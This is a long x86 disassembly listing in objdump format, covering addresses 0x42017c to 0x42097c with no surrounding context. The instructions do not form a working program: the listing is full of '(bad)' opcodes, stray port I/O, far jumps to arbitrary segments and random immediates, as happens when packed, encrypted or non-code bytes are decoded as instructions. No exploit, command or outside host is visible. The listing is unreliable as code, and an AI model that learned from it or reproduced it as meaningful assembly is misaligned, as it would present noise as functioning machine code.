  42017c:	mov    ch,0xe3
  42017e:	retf   0x62e0
  420181:	mov    edi,0xbddfb9a
  420186:	inc    esi
  420187:	xor    BYTE PTR [esi+0x61c26c68],bl
  42018d:	icebp  
  42018e:	sbb    BYTE PTR [ebp-0x1f300603],al
  420194:	out    0xf,eax
  420196:	gs pop esp
  420198:	xor    BYTE PTR [edi],0xe4
  42019b:	pop    ds
  42019c:	inc    edx
  42019d:	ret    
  42019e:	leave  
  42019f:	stos   DWORD PTR es:[edi],eax
  4201a0:	push   ss
  4201a1:	sub    BYTE PTR [esi],bl
  4201a3:	mov    bh,0xec
  4201a5:	aaa    
  4201a6:	mov    bl,0x9c
  4201a8:	push   cs
  4201a9:	jb     0x420213
  4201ab:	test   DWORD PTR [esi-0x2c6c3d94],esp
  4201b1:	outs   dx,DWORD PTR ds:[esi]
  4201b2:	push   ebp
  4201b3:	pop    ss
  4201b4:	push   es
  4201b5:	aam    0x43
  4201b7:	loop   0x4201c2
  4201b9:	in     al,0xce
  4201bb:	int    0x8a
  4201bd:	pop    ss
  4201be:	les    eax,FWORD PTR [esi-0x4e251ace]
  4201c4:	shl    BYTE PTR [esi-0x22],1
  4201c7:	daa    
  4201c8:	sub    cl,BYTE PTR [edx]
  4201ca:	jg     0x420189
  4201cc:	inc    esi
  4201cd:	mov    ecx,0x78e58920
  4201d2:	outs   dx,DWORD PTR ds:[esi]
  4201d3:	loop   0x420190
  4201d5:	push   ebp
  4201d6:	out    dx,eax
  4201d7:	cmc    
  4201d8:	lahf   
  4201d9:	mov    dh,0xc4
  4201db:	lahf   
  4201dc:	mov    ds:0xc2b37b82,al
  4201e1:	and    cl,ch
  4201e3:	leave  
  4201e4:	mov    ds:0x850eb65d,al
  4201e9:	scas   eax,DWORD PTR es:[edi]
  4201ea:	fdivr  QWORD PTR [ecx+0x55]
  4201ed:	mov    DWORD PTR [ecx+0x5d],esi
  4201f0:	and    BYTE PTR [ecx+esi*4],dh
  4201f3:	mov    ds:0x38570f61,al
  4201f8:	pop    esi
  4201f9:	(bad)  
  4201fa:	and    eax,ebp
  4201fc:	inc    ecx
  4201fd:	jnp    0x4201db
  4201ff:	(bad)  
  420200:	addr16 ret 0x6a9b
  420204:	push   ebp
  420205:	jb     0x4201f8
  420207:	push   edi
  420208:	push   ss
  420209:	leave  
  42020a:	push   ss
  42020b:	or     cl,cl
  42020d:	scas   al,BYTE PTR es:[edi]
  42020e:	icebp  
  42020f:	fs mov bl,0xa2
  420212:	test   BYTE PTR [edi+0x33be64c6],dh
  420218:	xor    BYTE PTR [edx-0x787c827e],bh
  42021e:	sbb    eax,esi
  420220:	loope  0x420297
  420222:	mov    ah,0x5e
  420224:	xchg   edx,eax
  420225:	fbld   TBYTE PTR [eax-0x18a8ede8]
  42022b:	pop    ebp
  42022c:	adc    eax,0x4652d4ec
  420231:	xchg   ecx,eax
  420232:	pop    ebx
  420233:	and    ch,BYTE PTR [eax-0x1d740226]
  420239:	aas    
  42023a:	popa   
  42023b:	pop    ds
  42023c:	jmp    0x2770247c
  420241:	xor    BYTE PTR [ebx-0x6f2f1faf],bh
  420247:	shr    DWORD PTR [eax],1
  420249:	and    al,0xb3
  42024b:	push   esi
  42024c:	jmp    0x233d82c9
  420251:	std    
  420252:	cmp    eax,0xeb5b5a1c
  420257:	xchg   edx,eax
  420258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420259:	mov    BYTE PTR [ebx-0x7a],ah
  42025c:	mov    DWORD PTR [esp+eax*1-0x7c],edx
  420260:	push   ss
  420261:	pusha  
  420262:	in     eax,0x55
  420264:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  420266:	std    
  420267:	lds    ecx,FWORD PTR [eax]
  420269:	sbb    ch,bh
  42026b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42026c:	and    DWORD PTR ds:0x352e597e,esp
  420272:	inc    esp
  420273:	ja     0x42029b
  420275:	xchg   ecx,eax
  420276:	or     esp,DWORD PTR [ebp-0x77]
  420279:	rcr    BYTE PTR [ebp+0x4ad69e03],cl
  42027f:	xchg   edx,eax
  420280:	cdq    
  420281:	int3   
  420282:	jecxz  0x42022b
  420284:	jb     0x420293
  420286:	pushf  
  420287:	pop    es
  420288:	fsubr  DWORD PTR fs:0x3fde3f57
  42028f:	jle    0x42029b
  420291:	or     bl,ch
  420293:	xor    DWORD PTR [eax-0x7a],0x70
  420297:	pushf  
  420298:	lods   al,BYTE PTR ds:[esi]
  42029a:	add    esp,DWORD PTR [esi+0x6fefd15e]
  4202a0:	xchg   ch,ch
  4202a2:	or     al,0xef
  4202a4:	cs jg  0x420259
  4202a7:	or     al,0xc2
  4202a9:	pop    edx
  4202aa:	jp     0x4202a9
  4202ac:	pop    edi
  4202ad:	mov    eax,ds:0x9617ffc3
  4202b2:	jp     0x420310
  4202b4:	test   bh,ch
  4202b6:	jnp    0x420309
  4202b8:	add    eax,0x34
  4202bb:	push   edx
  4202bc:	lock std 
  4202be:	aad    0x16
  4202c0:	adc    ah,BYTE PTR [eax+0x22]
  4202c3:	imul   ch
  4202c5:	daa    
  4202c6:	imul   ebx,DWORD PTR [ecx-0x6b],0xb07f73fc
  4202cd:	in     eax,0x34
  4202cf:	test   ebp,esi
  4202d1:	into   
  4202d2:	imul   ebx,DWORD PTR [ecx-0x2ecbd717],0x7bf39eef
  4202dc:	ficomp WORD PTR [esi]
  4202de:	push   cs
  4202df:	or     BYTE PTR [eax+0x6b],0xdc
  4202e3:	dec    ecx
  4202e4:	and    BYTE PTR [esi+ebx*4+0x7cd65b36],al
  4202eb:	jge    0x42027a
  4202ed:	inc    esp
  4202ee:	mov    eax,DWORD PTR [esp+ebp*1-0x308aa810]
  4202f5:	(bad)  
  4202f6:	lods   eax,DWORD PTR ds:[esi]
  4202f7:	fmul   QWORD PTR [ebx+0x4770b67c]
  4202fd:	shr    DWORD PTR [ebx+0x57],cl
  420300:	adc    al,0xbc
  420302:	lods   al,BYTE PTR ds:[esi]
  420303:	cmp    eax,0x487479f1
  420308:	push   es
  420309:	mov    edx,0x12baa9fd
  42030e:	icebp  
  42030f:	jmp    0x9b66:0x454d593a
  420316:	jae    0x4202cf
  420318:	mov    ecx,0xa63a611e
  42031d:	cmc    
  42031e:	adc    al,0x11
  420320:	ss ja  0x42031a
  420323:	add    eax,0xaed55064
  420328:	xor    esp,DWORD PTR [esi-0x50]
  42032b:	inc    esi
  42032c:	cmp    al,0x43
  42032e:	fcomp  DWORD PTR [ecx]
  420330:	mov    ecx,0x84186e9c
  420335:	dec    edx
  420336:	ret    0xb178
  420339:	cmc    
  42033a:	push   0xffffffa1
  42033c:	sub    al,0xbb
  42033e:	sub    al,BYTE PTR [edi]
  420340:	fnstsw WORD PTR [ecx-0x39c3aaf6]
  420346:	enter  0x2471,0x36
  42034a:	mov    esi,DWORD PTR [eax]
  42034c:	or     cl,BYTE PTR [eax-0x250feaec]
  420352:	push   edx
  420353:	push   esi
  420354:	cmp    dl,dl
  420356:	mov    al,ds:0xfd307d6e
  42035b:	sub    BYTE PTR [esi],0x6b
  42035e:	pop    es
  42035f:	dec    ebp
  420360:	out    0xe7,eax
  420362:	icebp  
  420363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420364:	dec    ebx
  420365:	pop    edi
  420366:	(bad)  
  420367:	retf   
  420368:	mov    bh,0xa1
  42036a:	or     al,al
  42036c:	ins    BYTE PTR es:[edi],dx
  42036d:	ss in  al,dx
  42036f:	jns    0x420315
  420371:	ror    BYTE PTR [edi-0x55bd90b7],1
  420377:	xor    BYTE PTR [ebp+0x0],ch
  42037a:	(bad)
  42037d:	dec    BYTE PTR [esi]
  42037f:	fcom   QWORD PTR [edx]
  420381:	mov    bl,0xae
  420383:	add    BYTE PTR [ecx],dl
  420385:	ins    DWORD PTR es:[edi],dx
  420386:	pop    esi
  420387:	push   0xb
  420389:	sbb    ebp,edi
  42038b:	sub    DWORD PTR [eax+ebx*1+0x3e6efae],0xe1de2d00
  420396:	jbe    0x420349
  420398:	(bad)  
  42039a:	push   esp
  42039b:	ins    BYTE PTR es:[edi],dx
  42039c:	retf   
  42039d:	add    DWORD PTR [edi],ebp
  42039f:	(bad)  
  4203a0:	lds    edi,FWORD PTR [ebx-0x32e278c5]
  4203a6:	xor    ch,0x5e
  4203a9:	shl    dh,0xcf
  4203ac:	out    dx,al
  4203ad:	xor    esi,esi
  4203af:	inc    esp
  4203b0:	adc    bh,BYTE PTR [ecx+0x66]
  4203b3:	shr    DWORD PTR [eax],0xe7
  4203b6:	call   0x168d:0x574fa0eb
  4203bd:	lods   eax,DWORD PTR ds:[esi]
  4203be:	test   eax,0x88b5712a
  4203c3:	sbb    ch,ah
  4203c5:	add    eax,DWORD PTR [edi+ebx*8]
  4203c8:	out    dx,eax
  4203c9:	dec    ebp
  4203ca:	loop   0x42040f
  4203cc:	pop    ds
  4203cd:	and    eax,0x75b78b8e
  4203d2:	cmp    eax,0x7b5407ca
  4203d7:	jo     0x42038a
  4203d9:	push   ebx
  4203da:	cmp    dh,bl
  4203dc:	xor    al,0xae
  4203de:	cdq    
  4203df:	lock mov edx,0x79112ed
  4203e5:	clc    
  4203e6:	xor    DWORD PTR [eax+0x79b52a4c],edi
  4203ec:	push   ebx
  4203ed:	sbb    eax,0x626cd04d
  4203f2:	or     dh,BYTE PTR gs:[eax+eax*2]
  4203f6:	lods   eax,DWORD PTR ds:[esi]
  4203f7:	sbb    DWORD PTR [edx+ebx*8+0x6a4e1c0f],0x11c23cac
  420402:	cmc    
  420403:	(bad)  
  420404:	not    BYTE PTR [esi+0x7f4afdc1]
  42040a:	retf   0xf976
  42040d:	jp     0x420466
  42040f:	dec    ebp
  420410:	nop
  420411:	dec    esi
  420412:	and    eax,0x8566e10c
  420417:	call   0x13610345
  42041c:	jl     0x420465
  42041e:	fidiv  WORD PTR [ebx]
  420420:	test   eax,0xf5e3755c
  420425:	ss push esp
  420427:	loope  0x42043e
  420429:	cmp    ecx,DWORD PTR [edi]
  42042b:	test   DWORD PTR [edi],eax
  42042d:	fild   QWORD PTR [ecx]
  42042f:	and    ch,BYTE PTR [edi+ecx*1+0x1514e0e1]
  420436:	es inc ecx
  420438:	or     BYTE PTR [eax-0x228aaa42],al
  42043e:	push   0x2d
  420440:	fild   QWORD PTR [eax]
  420442:	stc    
  420443:	mov    edx,0xef665ccc
  420448:	push   ds
  420449:	shr    ah,cl
  42044b:	adc    bh,BYTE PTR [ebp+eax*8-0x50189c33]
  420452:	and    BYTE PTR [eax+ebp*4],cl
  420455:	xchg   edi,eax
  420456:	sub    eax,0xb83a979
  42045b:	nop
  42045c:	mov    ebp,eax
  42045e:	lods   al,BYTE PTR ds:[esi]
  42045f:	sbb    eax,0x7e002729
  420464:	mov    edi,0xabf88984
  420469:	dec    esi
  42046a:	xchg   esi,eax
  42046b:	add    dl,BYTE PTR ss:[ebx]
  42046e:	icebp  
  42046f:	ret    
  420470:	popf   
  420471:	mov    ecx,0x63c24065
  420476:	jmp    0xcd1ec02a
  42047b:	(bad)  
  42047c:	or     cl,BYTE PTR [edx+ebp*1+0x1c404f2]
  420483:	pop    edi
  420484:	sbb    eax,0x83d66861
  420489:	fwait
  42048a:	mov    ds:0x3147a221,eax
  42048f:	mov    dl,0x6f
  420491:	stc    
  420492:	xor    eax,0x4c56a89e
  420497:	mov    dh,0x74
  420499:	ss push 0xffffffed
  42049c:	(bad)  
  42049d:	das    
  42049e:	xor    BYTE PTR [esi-0x24],0x32
  4204a2:	les    edx,FWORD PTR [edx-0x7e0f52e4]
  4204a8:	vcvtss2sd xmm3,xmm3,xmm6
  4204ac:	outs   dx,BYTE PTR ds:[esi]
  4204ad:	jbe    0x4204aa
  4204af:	stos   BYTE PTR es:[edi],al
  4204b0:	lods   eax,DWORD PTR ds:[esi]
  4204b1:	sub    bl,0x90
  4204b4:	jns    0x4204d3
  4204b6:	add    DWORD PTR [edi],0x5
  4204b9:	fnstenv [eax+edx*4+0x4ab5ef38]
  4204c0:	add    al,0x89
  4204c2:	loop   0x42046a
  4204c4:	(bad)  
  4204c5:	fcmovu st,st(7)
  4204c7:	add    BYTE PTR ss:[edx+0x4e],al
  4204cb:	push   es
  4204cc:	imul   esp,DWORD PTR [esi],0x3904e334
  4204d2:	loope  0x4204df
  4204d4:	add    al,0xd3
  4204d6:	fisubr WORD PTR [esi+edi*8]
  4204d9:	mov    eax,0xf4b05117
  4204de:	dec    ebx
  4204df:	cmp    esp,DWORD PTR [esi]
  4204e1:	cmp    al,0xb1
  4204e3:	loope  0x4204d6
  4204e5:	lods   eax,DWORD PTR ds:[esi]
  4204e6:	adc    BYTE PTR cs:[edi],cl
  4204e9:	fcomp  QWORD PTR [ecx]
  4204eb:	imul   edi,ebp,0xde6f74f5
  4204f1:	jmp    0x420551
  4204f3:	inc    edx
  4204f4:	shr    BYTE PTR [edi+0x32e9ad79],1
  4204fa:	outs   dx,DWORD PTR ds:[esi]
  4204fb:	scas   al,BYTE PTR es:[edi]
  4204fc:	push   ecx
  4204fd:	fwait
  4204fe:	and    cl,BYTE PTR [edi]
  420500:	les    esi,FWORD PTR [eax]
  420502:	sub    al,BYTE PTR [ebx+0xa4963e5]
  420508:	sbb    al,0x62
  42050a:	fdiv   DWORD PTR [eax+0x7]
  42050d:	lahf   
  42050e:	xor    al,0xac
  420510:	push   eax
  420511:	gs (bad) 
  420513:	cmp    ecx,DWORD PTR [esi-0x25]
  420516:	mov    eax,ds:0x68a9807e
  42051b:	(bad)
  42051e:	add    esp,esp
  420520:	rcr    DWORD PTR [esi],1
  420522:	mov    ds:0x703111b,al
  420527:	jb     0x4204fe
  420529:	pusha  
  42052a:	jno    0x420542
  42052c:	xchg   ebp,eax
  42052d:	xlat   BYTE PTR ds:[ebx]
  42052e:	mov    ecx,0x71869c0d
  420533:	jmp    0x6882:0xb3792397
  42053a:	dec    edx
  42053b:	int    0x8d
  42053d:	fidiv  WORD PTR [edi]
  42053f:	xor    bl,BYTE PTR [esi-0x33]
  420542:	sti    
  420543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420544:	xor    bh,BYTE PTR [ebp-0xae89799]
  42054a:	data16 aad 0x56
  42054d:	out    0x95,eax
  42054f:	mov    esp,0x33df5c1f
  420554:	pop    ebp
  420555:	cmp    eax,0xa619b191
  42055a:	sbb    DWORD PTR [esi],esi
  42055c:	cmp    esp,DWORD PTR [edi+ebx*1]
  42055f:	pop    ebp
  420560:	mov    ecx,0x752d1c43
  420565:	cld    
  420566:	loope  0x42053a
  420568:	stos   DWORD PTR es:[edi],eax
  420569:	aas    
  42056a:	test   al,0x4a
  42056c:	jmp    0x329f11ff
  420571:	rcl    ecx,0x90
  420574:	aaa    
  420575:	cmp    eax,0x2704bc60
  42057a:	ds ins DWORD PTR es:[edi],dx
  42057c:	jo     0x4205a3
  42057e:	lea    ecx,[ebx-0x31dd4e0f]
  420584:	mov    esi,DWORD PTR [edi]
  420586:	adc    al,0x96
  420588:	inc    esi
  420589:	xchg   DWORD PTR [edi],ebp
  42058b:	inc    eax
  42058c:	mov    cl,0x3c
  42058e:	adc    al,0x64
  420590:	out    0xf4,eax
  420592:	pop    esi
  420593:	aad    0xe7
  420595:	xchg   esp,eax
  420596:	mov    edi,cs
  420598:	pop    ecx
  420599:	int    0x4f
  42059b:	mov    esi,gs
  42059d:	aad    0xf5
  42059f:	in     eax,dx
  4205a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205a1:	dec    esp
  4205a2:	xor    DWORD PTR [eax+edx*1+0x69],edi
  4205a6:	or     al,0xc8
  4205a8:	and    bl,BYTE PTR [edx+0x2a]
  4205ab:	inc    esp
  4205ac:	icebp  
  4205ad:	ret    
  4205ae:	jp     0x4205e2
  4205b0:	jns    0x4205a7
  4205b2:	icebp  
  4205b3:	cmp    al,0x49
  4205b5:	mov    ds:0xba70de9f,eax
  4205ba:	aad    0x53
  4205bc:	mov    ch,0x94
  4205be:	dec    edi
  4205bf:	(bad)  
  4205c0:	xor    DWORD PTR [eax],ecx
  4205c2:	loopne 0x42061d
  4205c4:	mov    dl,0xdf
  4205c6:	aaa    
  4205c7:	int3   
  4205c8:	dec    ecx
  4205c9:	jge    0x4205f2
  4205cb:	dec    eax
  4205cc:	mov    ebp,0xe1ae9708
  4205d1:	outs   dx,DWORD PTR ds:[esi]
  4205d2:	jmp    0x420597
  4205d4:	push   edi
  4205d5:	inc    edx
  4205d6:	cmp    al,0x81
  4205d9:	push   ss
  4205da:	adc    bh,dl
  4205dc:	add    esi,DWORD PTR [ecx-0x1d35f27f]
  4205e2:	sub    BYTE PTR [ebp+0x7dfe56e3],bh
  4205e8:	outs   dx,DWORD PTR ds:[esi]
  4205e9:	mov    esp,0xfcac426b
  4205ee:	ja     0x420630
  4205f0:	jg     0x42065c
  4205f2:	pop    ds
  4205f3:	je     0x42063c
  4205f5:	inc    ebp
  4205f6:	stos   BYTE PTR es:[edi],al
  4205f7:	push   ebp
  4205f8:	xchg   ebp,eax
  4205f9:	pop    esp
  4205fa:	out    dx,al
  4205fb:	cmp    al,0x5d
  4205fd:	iret   
  4205fe:	add    DWORD PTR [eax],esp
  420600:	mov    cs,ebp
  420602:	iret   
  420603:	xor    al,0xf8
  420605:	and    eax,0x92939aed
  42060a:	adc    BYTE PTR [esi+esi*2-0x2b],bh
  42060e:	push   ebx
  42060f:	shl    DWORD PTR [ecx],1
  420611:	xchg   esi,eax
  420612:	loope  0x4205d6
  420614:	xor    eax,0xf36df800
  420619:	or     al,0x1c
  42061b:	cdq    
  42061c:	les    ebp,FWORD PTR [eax-0x12]
  42061f:	xchg   ebx,eax
  420620:	pop    ebx
  420621:	div    DWORD PTR [esi+0x45]
  420624:	inc    esi
  420625:	pop    edi
  420626:	lods   al,BYTE PTR ds:[esi]
  420627:	das    
  420628:	inc    ecx
  420629:	and    al,0x2f
  42062b:	adc    eax,0x8752b9a0
  420630:	psadbw mm2,QWORD PTR [ebx+0x324c0022]
  420637:	lahf   
  420638:	fmul   QWORD PTR [ecx+edx*1]
  42063b:	add    eax,0x194896a
  420640:	xor    al,0x68
  420642:	add    cl,BYTE PTR [esi+0x12afbe4b]
  420648:	hlt    
  420649:	enter  0x32f2,0x50
  42064d:	jo     0x420691
  42064f:	mov    ebx,0x38ebeff5
  420654:	xchg   esp,eax
  420655:	fisub  WORD PTR [edx-0x43b6bd05]
  42065b:	rcr    BYTE PTR [eax+0x52],0xd4
  42065f:	mov    dl,0xe1
  420661:	dec    ebp
  420662:	imul   edi,DWORD PTR [ebp+0x12],0x50
  420666:	jg     0x420604
  420668:	in     eax,dx
  420669:	sbb    eax,0xa22c2c94
  42066e:	push   0xffffff95
  420670:	sub    al,0xaa
  420672:	cmp    edx,DWORD PTR [ebx]
  420674:	stos   BYTE PTR es:[edi],al
  420675:	lock aam 0xf7
  420678:	pop    ebp
  420679:	out    0xb3,eax
  42067b:	or     eax,0xc51302db
  420680:	jg     0x42069a
  420682:	inc    eax
  420683:	xchg   ecx,eax
  420684:	xchg   ebp,eax
  420685:	fcomp  DWORD PTR [ebx+0x49]
  420688:	cs fcomp st(2)
  42068b:	mov    bl,0x9c
  42068d:	test   BYTE PTR [eax-0x14ac87e8],0x55
  420694:	loop   0x420664
  420696:	jmp    0xed26db2b
  42069b:	dec    edx
  42069c:	lahf   
  42069d:	jb     0x4206cd
  42069f:	mov    ch,0x17
  4206a1:	lahf   
  4206a2:	xor    al,0x55
  4206a4:	inc    ecx
  4206a5:	test   eax,0x7a343b4d
  4206aa:	scas   eax,DWORD PTR es:[edi]
  4206ab:	mov    edi,0x7c62b060
  4206b0:	cmp    esi,esp
  4206b2:	into   
  4206b3:	mov    ch,0xd9
  4206b5:	dec    esp
  4206b6:	ds sub edi,ecx
  4206b9:	push   edx
  4206ba:	je     0x42071d
  4206bc:	jecxz  0x4206c5
  4206be:	addr16 int 0x47
  4206c1:	jae    0x420653
  4206c3:	and    BYTE PTR [ecx+0x6879f710],ch
  4206c9:	or     edi,edi
  4206cb:	jns    0x420654
  4206cd:	mov    ebx,ebx
  4206cf:	fwait
  4206d0:	or     ebp,eax
  4206d2:	push   0x18
  4206d4:	and    BYTE PTR [edx-0x2e138efb],ah
  4206da:	fist   WORD PTR [edx+0x167f1337]
  4206e0:	mov    edx,0xe13f91f6
  4206e5:	test   al,0x85
  4206e7:	cmp    bh,0xff
  4206ea:	leave  
  4206eb:	mov    edx,DWORD PTR [edx+0x7f]
  4206ee:	pop    ebp
  4206ef:	call   0x546d713e
  4206f4:	repz xor DWORD PTR [eax+0x123dbdec],edx
  4206fb:	call   0x8df:0xa248cacf
  420702:	mov    esp,DWORD PTR [ebx-0x7d6c05c0]
  420708:	mov    edi,0x1d4a5904
  42070d:	dec    edx
  42070e:	retf   0xdcba
  420711:	mov    cl,0x4e
  420713:	adc    edx,ecx
  420715:	in     eax,dx
  420716:	xor    eax,0xb308f78a
  42071b:	jne    0x420713
  42071d:	(bad)  
  42071f:	retf   
  420720:	adc    al,0x76
  420722:	xchg   edx,eax
  420723:	les    edi,FWORD PTR [edx-0x33]
  420726:	jae    0x4206ff
  420728:	mov    esi,DWORD PTR [eax+0x69]
  42072b:	dec    edi
  42072c:	sub    eax,0xd515234c
  420731:	or     eax,0x9582c7a3
  420736:	push   edx
  420737:	mov    bl,0xdf
  420739:	mov    dl,0x29
  42073b:	mov    dh,0xc5
  42073d:	and    BYTE PTR [edx-0x17],dl
  420740:	inc    ecx
  420741:	push   esi
  420742:	mov    eax,DWORD PTR ds:0x5b6e571b
  420748:	ins    DWORD PTR es:[edi],dx
  420749:	rol    BYTE PTR [bx+si+0x2066],cl
  42074e:	fmul   st,st(1)
  420750:	inc    eax
  420751:	test   eax,0x633c4c63
  420756:	or     al,0xae
  420758:	mov    BYTE PTR [edi+edi*8],ah
  42075b:	xchg   esp,eax
  42075c:	fsub   QWORD PTR [eax+0x7d]
  42075f:	and    ch,BYTE PTR [ebx-0x41]
  420762:	push   edx
  420763:	add    cl,0x90
  420766:	push   eax
  420767:	or     al,BYTE PTR [bp-0x75b3]
  42076c:	cmp    eax,0x33cf9fcc
  420771:	and    edx,DWORD PTR [edx]
  420773:	(bad)
  420776:	gs inc ebx
  420778:	xchg   ebx,eax
  420779:	push   cs
  42077a:	out    0xcc,al
  42077c:	fnstcw WORD PTR [ecx]
  42077e:	mov    bh,0xfc
  420780:	fiadd  DWORD PTR [ecx+0x2bbd482d]
  420786:	test   BYTE PTR ds:0xfafff0e0,dh
  42078c:	or     eax,0x3a3ed32f
  420791:	or     al,0xc7
  420793:	dec    eax
  420794:	sub    al,0xad
  420796:	inc    edi
  420797:	pop    ecx
  420798:	pop    si
  42079a:	dec    ebx
  42079b:	mov    edx,esi
  42079d:	lahf   
  42079e:	adc    ebx,DWORD PTR [esi-0xa5479c]
  4207a4:	test   bh,al
  4207a6:	out    dx,al
  4207a7:	and    bh,BYTE PTR ds:0x7d978db7
  4207ad:	sar    BYTE PTR [ecx+0x35c139c],1
  4207b3:	aam    0xe0
  4207b5:	(bad)  
  4207b6:	popf   
  4207b7:	cwde   
  4207b8:	mov    cl,0xc7
  4207ba:	stos   BYTE PTR es:[edi],al
  4207bb:	aaa    
  4207bc:	int    0x9d
  4207be:	inc    edx
  4207bf:	push   ebp
  4207c0:	fstp   DWORD PTR [edx]
  4207c2:	and    eax,0xb9c1d804
  4207c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c8:	loope  0x42077f
  4207ca:	sahf   
  4207cb:	imul   esp,DWORD PTR [edx+0x70c1d911],0xffffffbd
  4207d2:	sbb    al,0x40
  4207d4:	push   ds
  4207d5:	add    ch,BYTE PTR cs:[esi-0x5c74f3a9]
  4207dc:	scas   eax,DWORD PTR es:[edi]
  4207dd:	xor    ecx,DWORD PTR [esp+ebp*1-0x64]
  4207e1:	in     eax,dx
  4207e2:	jmp    0x4207f9
  4207e4:	fs pop ecx
  4207e6:	pusha  
  4207e7:	mov    bh,0xa0
  4207e9:	aaa    
  4207ea:	jge    0x420796
  4207ec:	or     al,0xbd
  4207ee:	xchg   DWORD PTR [eax],eax
  4207f0:	push   eax
  4207f1:	fnsave [edx-0x48f37cfe]
  4207f7:	nop
  4207f8:	rcl    BYTE PTR [edi+0x1d377dc0],1
  4207fe:	jmp    0x9fd033b6
  420803:	sub    edx,DWORD PTR [ebx]
  420805:	adc    BYTE PTR [esi-0x7a336bcd],bh
  42080b:	cmp    esi,DWORD PTR [edx-0x1a]
  42080e:	dec    eax
  42080f:	data16 add al,0x4b
  420812:	jne    0x42082d
  420814:	cs (bad) 
  420817:	xor    eax,0xea4d28c4
  42081c:	test   DWORD PTR [ebx+0x48],eax
  42081f:	loope  0x4207c3
  420821:	xor    al,0x9a
  420823:	sub    al,0x9c
  420825:	xchg   edi,eax
  420826:	mov    bl,0x74
  420828:	mov    ds:0xf2c61055,al
  42082d:	neg    BYTE PTR ds:0xf0ca629d
  420833:	or     eax,edi
  420835:	iret   
  420836:	imul   ch
  420838:	outs   dx,BYTE PTR ds:[esi]
  420839:	jle    0x420801
  42083b:	and    dl,BYTE PTR [edx]
  42083d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42083e:	sbb    bh,dl
  420840:	mov    ds:0x11e3dc20,al
  420845:	pop    es
  420846:	or     BYTE PTR [ebp-0x5c74c812],cl
  42084c:	std    
  42084d:	test   DWORD PTR [ecx+0xbfdb08c],edx
  420853:	sub    BYTE PTR [esi],bl
  420855:	leave  
  420856:	jb     0x420884
  420858:	test   eax,0x658268a3
  42085d:	pop    esi
  42085e:	mov    ebx,0xe2240957
  420863:	into   
  420864:	sbb    DWORD PTR [ebp+0x3c],ebx
  420867:	das    
  420868:	pop    es
  420869:	retf   0x6d00
  42086c:	push   0xffffffc5
  42086e:	mov    eax,0x15d4b2ea
  420873:	xor    DWORD PTR [ebx],edx
  420875:	shl    bl,0xf9
  420878:	sbb    bl,cl
  42087a:	hlt    
  42087b:	aad    0x2e
  42087d:	sub    al,0x7f
  42087f:	push   es
  420880:	lahf   
  420881:	int3   
  420882:	cdq    
  420883:	xor    DWORD PTR [edi+0x341a6758],ecx
  420889:	jb     0x4208ce
  42088b:	ror    BYTE PTR [edi],1
  42088d:	fild   QWORD PTR [ebx+0x25]
  420890:	push   esp
  420891:	sbb    DWORD PTR [eax],ecx
  420893:	mov    esi,0xbad8d966
  420898:	push   0xda91d1ab
  42089d:	test   DWORD PTR [edx-0xb9f89bb],eax
  4208a3:	clc    
  4208a4:	test   DWORD PTR [esi-0x153882ff],0xd8efd689
  4208ae:	push   esp
  4208af:	sbb    esp,DWORD PTR [edx+ebx*8]
  4208b2:	hlt    
  4208b3:	inc    edi
  4208b4:	sub    DWORD PTR [ebp+ebp*4+0x71],ebp
  4208b8:	jmp    0x8fa3eebd
  4208bd:	pop    ds
  4208be:	in     eax,dx
  4208bf:	out    dx,al
  4208c0:	xchg   BYTE PTR [ebp+0x64],bh
  4208c3:	jmp    0x9171:0x4dd49a8
  4208ca:	xchg   edi,eax
  4208cb:	jmp    FWORD PTR [eax]
  4208cd:	xchg   esi,eax
  4208ce:	jp     0x4208b5
  4208d0:	jl     0x4208e7
  4208d2:	popa   
  4208d3:	add    al,0x4b
  4208d5:	add    eax,0x85793245
  4208da:	cmp    ebp,esp
  4208dc:	cmp    eax,DWORD PTR [edi+ecx*1+0x2b]
  4208e0:	hlt    
  4208e1:	pop    ecx
  4208e2:	jo     0x4208c9
  4208e4:	jle    0x42086b
  4208e6:	push   edi
  4208e7:	inc    edx
  4208e8:	leave  
  4208e9:	(bad)  
  4208ea:	and    edi,DWORD PTR [ebx+0x5d907108]
  4208f0:	mov    ebp,0x71e4509b
  4208f5:	mov    es,WORD PTR [ebx+0x1e]
  4208f8:	adc    al,bl
  4208fa:	sbb    DWORD PTR [ebp+0x4b],edi
  4208fd:	int    0x2b
  4208ff:	shl    ebp,0xf3
  420902:	adc    bl,ah
  420904:	clc    
  420905:	popf   
  420906:	jle    0x42088f
  420908:	add    cl,0xd5
  42090b:	repnz xchg ebp,eax
  42090d:	pop    es
  42090e:	or     eax,0x6c90cfa9
  420913:	jl     0x420919
  420915:	pop    ecx
  420916:	xor    BYTE PTR [edx-0x5d],dl
  420919:	in     eax,0x4
  42091b:	fild   DWORD PTR [eax+0x2d22a2d7]
  420921:	mov    WORD PTR [edi+0x4e596bea],ss
  420927:	and    al,0xc4
  420929:	mov    ebx,0x7c661e78
  42092e:	jp     0x4208b3
  420930:	das    
  420931:	je     0x420921
  420933:	xchg   BYTE PTR [esi+0xd821ab1],ah
  420939:	lods   eax,DWORD PTR ds:[esi]
  42093a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42093b:	dec    ebx
  42093c:	or     eax,0xce0fc026
  420941:	mov    al,ds:0x269093f6
  420946:	push   es
  420947:	push   ecx
  420948:	jecxz  0x42093a
  42094a:	outs   dx,BYTE PTR ds:[esi]
  42094b:	mov    ebx,0xc68aa910
  420950:	adc    ah,BYTE PTR [esi]
  420952:	ins    DWORD PTR es:[edi],dx
  420953:	sub    ch,BYTE PTR [edx-0x38aac884]
  420959:	(bad)  
  42095a:	xor    cl,BYTE PTR [ebx]
  42095c:	dec    esi
  42095d:	xor    BYTE PTR [esi+0x30],dl
  420960:	ss jmp 0x4208e6
  420963:	fdivr  st(1),st
  420965:	mov    BYTE PTR [ecx+0x4f],al
  420968:	sub    eax,0xc5ed8575
  42096d:	repnz inc edx
  42096f:	fxch   st(7)
  420971:	lock retf 
  420973:	push   ebp
  420974:	retf   0x9816
  420977:	sub    eax,0x70cb3760
  42097c:	jmp    0x8795:0xc8350efe
